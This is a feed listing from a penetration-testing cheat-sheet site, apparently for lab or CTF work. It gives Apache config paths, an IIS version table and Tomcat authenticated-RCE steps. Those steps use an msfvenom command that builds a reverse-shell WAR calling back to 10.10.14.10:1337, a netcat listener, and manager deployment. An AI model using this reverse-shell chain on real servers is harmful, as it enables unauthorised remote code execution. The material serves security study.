channel.title: Web Server on TLDRBins
channel.description: Recent content in Web Server on TLDRBins

item.title: Apache
item.description: Check Apache version apache Config location /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/default-ssl.conf

item.title: Apache Tomcat
item.description: Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war 2. Start a listener rlwrap nc -lvnp 1337 3a. Via Manager GUI +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1. Login to Tomcat Web Application Manager | | 2. WAR file to deploy -> Deploy | | 3. Click /revshell in Applications table | +--------------------------------------------+ 3b. Via Manager Script curl -u '<USERNAME>:<PASSWORD>' http://example.

item.title: IIS
item.description: IIS Version +---------------------------------------------------------------------------------+ | Version Start Date End Date | +---------------------------------------------------------------------------------+ | IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 | | IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 | | IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027 | | IIS 10 on Windows 10 Pro Jul 29, 2015 | | IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 | | IIS 8.
